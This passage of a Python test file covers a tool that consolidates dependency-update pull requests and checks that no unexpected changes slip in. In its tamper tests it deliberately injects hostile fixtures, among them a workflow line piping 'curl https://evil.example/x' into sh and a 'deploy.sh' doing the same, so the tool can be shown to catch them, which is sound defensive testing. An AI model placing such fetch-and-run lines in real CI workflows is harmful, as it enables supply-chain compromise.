            "merge-tree --write-tree": EXPECTED_TREE + "\n",
            "commit-tree": CHAIN_COMMIT + "\n",
            f"rev-parse {CHAIN_COMMIT}^": EXPECTED_TREE + "\n",
            "rev-parse HEAD^{tree}": OTHER_TREE + "\n",
            f"{EXPECTED_TREE} {OTHER_TREE}": raw(
                ("100644", "100644", BLOB_PAYLOAD, BLOB_PAYLOADQ_NEW, "M", CODEQL),
                ("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"),
            ),
        }
    )
    ok, differing = dcon.verify_expected_merge(BASE_OID, ["pr-450"], "HEAD", run)
    assert not ok
    assert differing == sorted([CODEQL, "evil.sh"])


def test_verify_expected_merge_compares_trees_with_the_structural_flags():
    """The tree-vs-tree diff is metadata too, not diff text."""
    run = FakeRun(
        responses={
            "merge-tree --write-tree": EXPECTED_TREE + "\n",
            "commit-tree": CHAIN_COMMIT + "\n",
            f"rev-parse {CHAIN_COMMIT}^": EXPECTED_TREE + "\n",
            "rev-parse HEAD^{tree}": OTHER_TREE + "\n",
        }
    )
    dcon.verify_expected_merge(BASE_OID, ["pr-450"], "HEAD", run)
    diff = next(c for c in run.calls if c[:2] == ["git", "diff"])
    assert "--raw" in diff and "-z" in diff and "--no-abbrev" in diff
    assert diff[-2:] == [EXPECTED_TREE, OTHER_TREE]


def test_consolidate_family_returns_to_main_after_a_union_mismatch():
    sneaky = COMBINED + raw(("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"))
    run = _happy_run(responses={"origin/main...HEAD": sneaky})
    ok, _ = dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    assert not ok
    assert run.ran("switch main")


def test_consolidate_family_refuses_when_the_raw_diff_is_unreadable():
    """A check that cannot run is not a check that passed."""
    run = _happy_run(responses={"origin/main...HEAD": "not a raw diff at all"})
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "unreadable" in message.lower()
    assert not run.ran("pr create")
    assert not run.ran("push")
    assert run.ran("switch main")


def test_consolidate_family_returns_cleanly_when_pr_create_fails():
    """Re-running a family whose PR already exists must not raise."""
    run = _happy_run(fail_on=("pr create",))
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "command failure" in message.lower()
    assert run.ran("switch main"), "must return to main even after a failure"


def test_consolidate_family_returns_cleanly_when_push_fails():
    run = _happy_run(fail_on=("push",))
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert not run.ran("pr create")
    assert run.ran("switch main")


def test_consolidate_family_refuses_when_no_member_contributed_a_change():
    """verify_union([], "") passes vacuously (True, set(), set()). If every
    member diff came back empty, that vacuous pass must not let an empty
    branch and an empty PR get created."""
    run = FakeRun(
        responses={
            "origin/main...pr-450": "",
            "origin/main...pr-452": "",
            "origin/main...HEAD": "",
        }
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "no member contributed" in message.lower()
    assert not run.ran("pr create")
    assert not run.ran("push")


def test_consolidate_family_aborts_on_merge_conflict():
    run = FakeRun(
        responses={"origin/main...pr-450": MEMBER_450},
        fail_on=("merge --no-edit pr-452",),
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "conflict" in message.lower()
    assert run.ran("merge --abort")
    assert not run.ran("pr create")
    assert run.ran("switch main")


def test_consolidate_family_never_merges_or_approves():
    run = _happy_run()
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    for forbidden in ("pr merge", "pr review", "pr ready"):
        assert not run.ran(forbidden), f"must never run: {forbidden}"


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------


def _write_fixtures(tmp_path):
    decisions = {
        "decisions": [
            {"number": 452, "code": "coupled", "family": "github/codeql-action"},
            {"number": 450, "code": "coupled", "family": "github/codeql-action"},
            {"number": 439, "code": "candidate", "family": None},
        ]
    }
    snapshot = {
        "pull_requests": [
            {"number": 452, "to_version": "4.38.0"},
            {"number": 450, "to_version": "4.38.0"},
            {"number": 439, "to_version": "1.2.3"},
        ]
    }
    dec_path = tmp_path / "decisions.json"
    snap_path = tmp_path / "snapshot.json"
    dec_path.write_text(json.dumps(decisions), encoding="utf-8")
    snap_path.write_text(json.dumps(snapshot), encoding="utf-8")
    return dec_path, snap_path


def test_main_dry_run_prints_plan_without_execute(tmp_path, capsys):
    """Without --execute, main must be pure: no consolidate_family call at all."""
    dec_path, snap_path = _write_fixtures(tmp_path)
    rc = dcon.main(["--decisions", str(dec_path), "--snapshot", str(snap_path)])
    assert rc == 0
    out = capsys.readouterr().out
    assert "would consolidate" in out
    assert "github/codeql-action" in out
    assert "450" in out and "452" in out


def test_main_skips_families_with_a_single_member(tmp_path, capsys):
    """A lone `coupled` PR (e.g. a family whose sibling already merged) is not
    consolidated -- there is nothing to union against."""
    decisions = {
        "decisions": [
            {"number": 442, "code": "coupled", "family": "npm:/frontend:vitest"},
        ]
    }
    snapshot = {"pull_requests": [{"number": 442, "to_version": "2.0.0"}]}
    dec_path = tmp_path / "decisions.json"
    snap_path = tmp_path / "snapshot.json"
    dec_path.write_text(json.dumps(decisions), encoding="utf-8")
    snap_path.write_text(json.dumps(snapshot), encoding="utf-8")

    rc = dcon.main(["--decisions", str(dec_path), "--snapshot", str(snap_path)])
    assert rc == 0
    assert "would consolidate" not in capsys.readouterr().out


def test_main_execute_invokes_consolidate_family_per_family(
    tmp_path, monkeypatch, capsys
):
    """`--execute` drives `consolidate_family`; the network/git seam is still
    the injected `run`, so this patches the function itself rather than
    touching a real git checkout."""
    dec_path, snap_path = _write_fixtures(tmp_path)
    calls = []

    def fake_consolidate_family(family, version, members, run=dcon._run):
        calls.append((family, version, members))
        return (True, f"family {family}: opened dep-consolidate/fake")

    monkeypatch.setattr(dcon, "consolidate_family", fake_consolidate_family)
    rc = dcon.main(
        ["--decisions", str(dec_path), "--snapshot", str(snap_path), "--execute"]
    )
    assert rc == 0
    assert calls == [("github/codeql-action", "4.38.0", [450, 452])]
    assert "opened dep-consolidate/fake" in capsys.readouterr().out


def test_main_execute_reports_error_and_nonzero_on_family_failure(
    tmp_path, monkeypatch, capsys
):
    """The union check is a security control. A ::warning:: with exit 0 is
    easy to miss on a manually dispatched run, so a failed family must be
    reported as an ::error:: and fail the job."""
    dec_path, snap_path = _write_fixtures(tmp_path)

    def fake_consolidate_family(family, version, members, run=dcon._run):
        return (False, f"family {family}: union mismatch")

    monkeypatch.setattr(dcon, "consolidate_family", fake_consolidate_family)
    rc = dcon.main(
        ["--decisions", str(dec_path), "--snapshot", str(snap_path), "--execute"]
    )
    assert rc != 0
    out = capsys.readouterr().out
    assert "::error::" in out
    assert "::warning::" not in out


# --------------------------------------------------------------------------
# Structural raw-diff parsing
# --------------------------------------------------------------------------


def test_parse_raw_reads_a_simple_modification():
    out = dcon.parse_raw(
        raw(
            (
                "100644",
                "100644",
                BLOB_PAYLOADQ_OLD,
                BLOB_PAYLOADQ_NEW,
                "M",
                ".github/workflows/codeql.yml",
            )
        )
    )
    assert out == [
        dcon.TreeEntry(".github/workflows/codeql.yml", "M", "100644", BLOB_PAYLOADQ_NEW)
    ]


def test_parse_raw_reads_several_records_from_one_nul_stream():
    out = dcon.parse_raw(
        raw(
            ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", "a.yml"),
            ("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "b.yml"),
        )
    )
    assert [e.path for e in out] == ["a.yml", "b.yml"]
    assert [e.status for e in out] == ["M", "A"]


def test_parse_raw_handles_an_empty_diff():
    assert dcon.parse_raw("") == []


def test_parse_raw_expands_a_rename_into_a_source_deletion_and_a_destination():
    """A rename must leave an entry at the path it vacated.

    Keyed only on the destination, a file renamed *out* of a protected
    directory would produce no entry at its original path at all -- the
    disappearance would be invisible, which is the direction that hides an
    attack rather than reporting it.
    """
    out = dcon.parse_raw(
        raw(
            (
                "100644",
                "100644",
                BLOB_PAYLOADQ_OLD,
                BLOB_PAYLOADQ_OLD,
                "R100",
                ".github/workflows/codeql.yml",
                "docs/codeql.yml",
            )
        )
    )
    assert dcon.TreeEntry(".github/workflows/codeql.yml", "D", "000000", ZEROS) in out
    assert dcon.TreeEntry("docs/codeql.yml", "R", "100644", BLOB_PAYLOADQ_OLD) in out


def test_parse_raw_does_not_desync_on_the_second_path_of_a_rename():
    """The record after a two-path R must still parse as a record.

    A parser that assumed one path per record would read the destination
    path as the next record's metadata field and lose every entry after it.
    """
    out = dcon.parse_raw(
        raw(
            (
                "100644",
                "100644",
                BLOB_PAYLOADQ_OLD,
                BLOB_PAYLOADQ_OLD,
                "R100",
                "old.yml",
                "new.yml",
            ),
            ("100644", "100644", BLOB_PAYLOADQ_NEW, BLOB_PAYLOAD, "M", "after.yml"),
        )
    )
    assert dcon.TreeEntry("after.yml", "M", "100644", BLOB_PAYLOAD) in out


def test_parse_raw_expands_a_copy_without_deleting_the_source():
    out = dcon.parse_raw(
        raw(
            (
                "100644",
                "100644",
                BLOB_PAYLOADQ_OLD,
                BLOB_PAYLOADQ_OLD,
                "C75",
                "src.yml",
                "copy.yml",
            )
        )
    )
    assert [e.path for e in out] == ["copy.yml"]


def test_parse_raw_drops_the_similarity_score_from_the_status():
    """The score reflects git's rename-detection budget, not the change."""
    out = dcon.parse_raw(
        raw(
            (
                "100644",
                "100644",
                BLOB_PAYLOADQ_OLD,
                BLOB_PAYLOADQ_OLD,
                "R087",
                "old.yml",
                "new.yml",
            )
        )
    )
    assert out[-1].status == "R"


def test_parse_raw_keeps_a_path_containing_a_newline_intact():
    """NUL separation is the reason the `-z` form is used.

    A path with a newline in it would split a line-oriented parser's record
    in half; here it is simply part of one field.
    """
    out = dcon.parse_raw(
        raw(("000000", "100644", ZEROS, BLOB_PAYLOADQ_OLD, "A", "we\nird.yml"))
    )
    assert out == [dcon.TreeEntry("we\nird.yml", "A", "100644", BLOB_PAYLOADQ_OLD)]


def test_parse_raw_rejects_a_record_without_a_leading_colon():
    with pytest.raises(dcon.RawParseError):
        dcon.parse_raw("100644 100644 x y M\0a.yml\0")


def test_parse_raw_rejects_a_combined_multi_parent_diff():
    """`A...B` never emits one, so its appearance means a different command."""
    with pytest.raises(dcon.RawParseError):
        dcon.parse_raw("::100644 100644 100644 aaa bbb ccc MM\0a.yml\0")


def test_parse_raw_rejects_a_metadata_field_with_the_wrong_arity():
    with pytest.raises(dcon.RawParseError):
        dcon.parse_raw(":100644 100644 M\0a.yml\0")


def test_parse_raw_rejects_a_record_with_no_path_field():
    with pytest.raises(dcon.RawParseError):
        dcon.parse_raw(
            ":100644 100644 %s %s M\0" % (BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW)
        )


def test_parse_raw_rejects_a_rename_with_no_destination_path():
    with pytest.raises(dcon.RawParseError):
        dcon.parse_raw(
            ":100644 100644 %s %s R100\0old.yml\0"
            % (BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_OLD)
        )


def test_parse_raw_rejects_an_empty_status():
    with pytest.raises(dcon.RawParseError):
        dcon.parse_raw(
            ":100644 100644 %s %s \0a.yml\0" % (BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW)
        )


def test_entries_by_path_rejects_a_duplicated_path():
    """Letting one entry overwrite another would discard a change."""
    with pytest.raises(dcon.RawParseError):
        dcon.entries_by_path(
            raw(
                (
                    "100644",
                    "100644",
                    BLOB_PAYLOADQ_OLD,
                    BLOB_PAYLOADQ_NEW,
                    "M",
                    "a.yml",
                ),
                ("100644", "100644", BLOB_PAYLOADQ_NEW, BLOB_PAYLOAD, "M", "a.yml"),
            )
        )


def test_tree_entry_repr_names_the_path_for_an_operator():
    entry = dcon.TreeEntry(".github/workflows/codeql.yml", "D", "000000", ZEROS)
    text = repr(entry)
    assert ".github/workflows/codeql.yml" in text
    assert text.startswith("<D ")


# --------------------------------------------------------------------------
# _run
#
# The real subprocess seam, exercised against real commands. Every other
# test in this file injects a fake `run`, so without these the function that
# actually executes git and gh is never run at all.
# --------------------------------------------------------------------------


def test_run_returns_stdout_when_capturing():
    assert "git version" in dcon._run(["git", "--version"], capture=True)


def test_run_discards_stdout_when_not_capturing():
    assert dcon._run(["git", "--version"]) == ""


def test_run_raises_command_failed_on_a_non_zero_exit():
    with pytest.raises(dcon.CommandFailed) as caught:
        dcon._run(["git", "rev-parse", "--verify", "refs/heads/no-such-branch-here"])
    assert "exited" in str(caught.value)


def test_run_converts_a_hang_into_command_failed():
    """A hung `git fetch` or `gh` must fail one family, not the whole job.

    Without a timeout this call blocks until CI kills the runner, and every
    family after it is skipped with no verdict -- the failure mode with the
    worst blast radius in this module, because it produces no report at all.
    """
    with pytest.raises(dcon.CommandFailed) as caught:
        dcon._run(
            [sys.executable, "-c", "import time; time.sleep(30)"],
            timeout=0.25,
        )
    message = str(caught.value)
    assert "did not finish" in message
    assert "0.25s" in message


# --------------------------------------------------------------------------
# Real git
#
# Every other test in this file injects a fake `run`, which means nothing has
# ever confirmed that `git diff --raw -z` and `git merge-tree --write-tree`
# emit the shapes the parser and the tree comparison assume -- and `_run`,
# the function that actually executes them, went uncovered. These tests run
# the real orchestration against a real repository on disk. Only `gh` is
# stubbed, by a shim on PATH; there is no network and no remote beyond a
# bare repository in tmp_path.
#
# This is the shape of test that would have caught the original text
# parser's assumptions, which were never checked against git's output.
# --------------------------------------------------------------------------


WORKFLOW = ".github/workflows/codeql.yml"

# Each `uses:` line is separated from the next by lines of context, so three
# members editing three different lines merge cleanly. Adjacent lines would
# conflict, which is a property of the file rather than of this control --
# and a conflict is reported, not smuggled past.
MEMBER_ACTIONS = ("init", "analyze", "upload-sarif")


def _workflow_text(versions):
    lines = ["name: codeql", "", "jobs:"]
    for action in MEMBER_ACTIONS:
        lines += [
            f"  scan-{action}:",
            "    runs-on: ubuntu-latest",
            "    steps:",
            "      - uses: actions/checkout@v5",
            f"      - uses: github/codeql-action/{action}@{versions[action]}",
            "        with:",
            "          languages: python",
            "",
        ]
    return "\n".join(lines) + "\n"


def _git(*args, cwd):
    """Run a real git command for fixture setup, failing loudly."""
    subprocess.run(
        ["git", *args],
        cwd=str(cwd),
        check=True,
        capture_output=True,
        text=True,
    )


@pytest.fixture
def repo(tmp_path, monkeypatch):
    """A repository with three member PRs all editing one workflow file.

    Built as a bare "upstream" plus a clone, because the code under test
    fetches `pull/<n>/head` from `origin` and pushes a branch to it. The
    member refs live under `refs/pull/`, exactly where GitHub puts them, so
    the fetch refspec under test is the real one.

    Global and system git config are pointed at os.devnull so a developer's
    own settings -- a signing key, a commit template, a hook template dir --
    cannot change what this test observes.
    """
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", os.devnull)
    monkeypatch.setenv("GIT_TERMINAL_PROMPT", "0")
    monkeypatch.setenv("GIT_AUTHOR_NAME", "Dep Triage Test")
    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "triage@example.invalid")
    monkeypatch.setenv("GIT_COMMITTER_NAME", "Dep Triage Test")
    monkeypatch.setenv("GIT_COMMITTER_EMAIL", "triage@example.invalid")

    upstream = tmp_path / "upstream.git"
    _git("init", "--bare", "-b", "main", str(upstream), cwd=tmp_path)

    seed = tmp_path / "seed"
    seed.mkdir()
    _git("init", "-b", "main", ".", cwd=seed)
    old = dict.fromkeys(MEMBER_ACTIONS, "v4.37.9")
    (seed / ".github" / "workflows").mkdir(parents=True)
    (seed / WORKFLOW).write_text(_workflow_text(old), encoding="utf-8")
    _git("add", "-A", cwd=seed)
    _git("commit", "-m", "base", cwd=seed)
    _git("remote", "add", "origin", str(upstream), cwd=seed)
    _git("push", "origin", "main", cwd=seed)

    # One member PR per action, each branched from the same base and each
    # changing a different line of the one shared file: the contested case.
    numbers = {}
    for index, action in enumerate(MEMBER_ACTIONS):
        number = 450 + index
        numbers[action] = number
        _git("switch", "-c", f"member-{action}", "main", cwd=seed)
        versions = dict(old)
        versions[action] = "v4.38.0"
        (seed / WORKFLOW).write_text(_workflow_text(versions), encoding="utf-8")
        _git("commit", "-am", f"bump codeql-action/{action}", cwd=seed)
        _git(
            "push",
            "origin",
            f"member-{action}:refs/pull/{number}/head",
            cwd=seed,
        )
        _git("switch", "main", cwd=seed)

    work = tmp_path / "work"
    _git("clone", str(upstream), str(work), cwd=tmp_path)
    _git("config", "user.name", "Dep Triage Test", cwd=work)
    _git("config", "user.email", "triage@example.invalid", cwd=work)
    _git("config", "commit.gpgsign", "false", cwd=work)

    # `gh` is the only thing stubbed. It records its arguments and exits 0,
    # so `pr create` and `pr comment` are observable without a network call.
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    log = tmp_path / "gh.log"
    shim = bin_dir / "gh"
    shim.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$GH_LOG"\nexit 0\n')
    shim.chmod(0o755)
    monkeypatch.setenv("GH_LOG", str(log))
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")

    monkeypatch.chdir(work)
    return SimpleNamespace(
        work=work,
        upstream=upstream,
        members=[numbers[action] for action in MEMBER_ACTIONS],
        gh_log=log,
    )


def _gh_calls(repo):
    if not repo.gh_log.exists():
        return []
    return repo.gh_log.read_text(encoding="utf-8").splitlines()


def test_real_git_consolidates_three_members_editing_one_file(repo):
    """The case the module exists for, end to end, with real git.

    All three members change `codeql.yml`, so every path in the diff is
    contested and the blob comparison abstains on all of them. The branch is
    verified against the tree `merge-tree` says the merge should produce, and
    because it is exactly that tree, the PR is opened.
    """
    seen = []

    def recording_run(args, capture=False, timeout=dcon._TIMEOUT_SECONDS):
        seen.append(list(args))
        return dcon._run(args, capture=capture, timeout=timeout)

    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", repo.members, recording_run
    )
    assert ok, message
    # Proof that this really is the contested route and not an accidental
    # pass through the blob comparison: all three members changed the one
    # file, so the branch was verified by recomputing the merge.
    chained = [c for c in seen if c[:3] == ["git", "merge-tree", "--write-tree"]]
    assert [c[-1] for c in chained] == [f"pr-{n}" for n in repo.members]

    calls = _gh_calls(repo)
    assert any(call.startswith("pr create") for call in calls), calls
    # The branch really reached the remote, and the version bumps really
    # landed in the one file all three members edited.
    pushed = subprocess.run(
        ["git", "show", "dep-consolidate/github-codeql-action-4.38.0:" + WORKFLOW],
        cwd=str(repo.upstream),
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    assert pushed.count("v4.38.0") == 3
    assert "v4.37.9" not in pushed


def test_real_git_leaves_the_checkout_on_main(repo):
    dcon.consolidate_family("github/codeql-action", "4.38.0", repo.members)
    head = subprocess.run(
        ["git", "branch", "--show-current"],
        cwd=str(repo.work),
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    assert head == "main"


def test_real_git_rejects_a_line_no_member_contributed(repo):
    """One extra line, committed onto the branch mid-consolidation.

    The smuggled line goes into the *contested* file, which is the only
    place it could hide: the blob comparison cannot decide that path, so the
    sole thing standing between this line and an opened PR is the expected
    merge tree. Injected through the `run` seam so every command still
    executes for real -- this is a tampered environment, not a fake runner.
    """
    smuggled = "      - run: curl https://evil.example/x | sh\n"
    tampered_after = f"pr-{repo.members[-1]}"

    def tampering_run(args, capture=False, timeout=dcon._TIMEOUT_SECONDS):
        out = dcon._run(args, capture=capture, timeout=timeout)
        if args[:3] == ["git", "merge", "--no-edit"] and args[3] == tampered_after:
            path = repo.work / WORKFLOW
            path.write_text(path.read_text(encoding="utf-8") + smuggled, "utf-8")
            dcon._run(["git", "commit", "-am", "chore: tidy workflow"])
        return out

    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", repo.members, tampering_run
    )
    assert not ok, "a line no member contributed must not be consolidated"
    assert "not the members' expected merge" in message
    assert WORKFLOW in message
    assert not any(call.startswith("pr create") for call in _gh_calls(repo))
    # Nothing reached the remote either.
    refs = subprocess.run(
        ["git", "for-each-ref", "--format=%(refname)", "refs/heads"],
        cwd=str(repo.upstream),
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    assert "dep-consolidate" not in refs


def test_real_git_rejects_a_whole_file_no_member_contributed(repo):
    """The same attack in a file no member touched.

    Caught one step earlier, by the blob comparison, because the path has no
    owner at all -- so the expected-merge check is never even reached.
    """

    def tampering_run(args, capture=False, timeout=dcon._TIMEOUT_SECONDS):
        out = dcon._run(args, capture=capture, timeout=timeout)
        if args[:3] == ["git", "merge", "--no-edit"] and args[3] == "pr-450":
            (repo.work / "deploy.sh").write_text("#!/bin/sh\ncurl x | sh\n", "utf-8")
            dcon._run(["git", "add", "deploy.sh"])
            dcon._run(["git", "commit", "-m", "chore: add helper"])
        return out

    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", repo.members, tampering_run
    )
    assert not ok
    assert "union mismatch" in message
    assert "deploy.sh" in message
    assert not any(call.startswith("pr create") for call in _gh_calls(repo))


def test_real_git_reports_a_conflict_between_members(repo):
    """Two members editing the *same* line cannot compose, and say so.

    The consolidation is abandoned, the in-progress merge is aborted rather
    than left half-applied, and the checkout returns to main.
    """
    # A fourth "member" that changes the same line as the first one, to a
    # different value, so the two cannot be merged together.
    _git("switch", "-c", "clashing", "origin/main", cwd=repo.work)
    text = (repo.work / WORKFLOW).read_text(encoding="utf-8")
    (repo.work / WORKFLOW).write_text(
        text.replace("init@v4.37.9", "init@v9.9.9"), encoding="utf-8"
    )
    _git("commit", "-am", "clashing bump", cwd=repo.work)
    _git("push", "origin", "clashing:refs/pull/998/head", cwd=repo.work)
    _git("switch", "main", cwd=repo.work)

    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [repo.members[0], 998]
    )
    assert not ok
    assert "conflicts" in message
    assert not any(call.startswith("pr create") for call in _gh_calls(repo))
    head = subprocess.run(
        ["git", "branch", "--show-current"],
        cwd=str(repo.work),
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    assert head == "main"


def test_real_git_parses_the_raw_diff_shape_git_actually_emits(repo):
    """The parser's assumptions, checked against git rather than a fixture.

    `raw()` in this file builds what the parser expects. This asserts git
    emits that: NUL-separated records, a leading colon, full 40-character
    hashes because of `--no-abbrev`, and one entry per path.
    """
    _git("fetch", "origin", f"pull/{repo.members[0]}/head:pr-450", cwd=repo.work)
    output = dcon._run(dcon._raw_diff_argv("origin/main...pr-450"), capture=True)
    assert "\0" in output
    entries = dcon.parse_raw(output)
    assert [entry.path for entry in entries] == [WORKFLOW]
    assert entries[0].status == "M"
    assert entries[0].newmode == "100644"
    assert len(entries[0].newsha) == 40
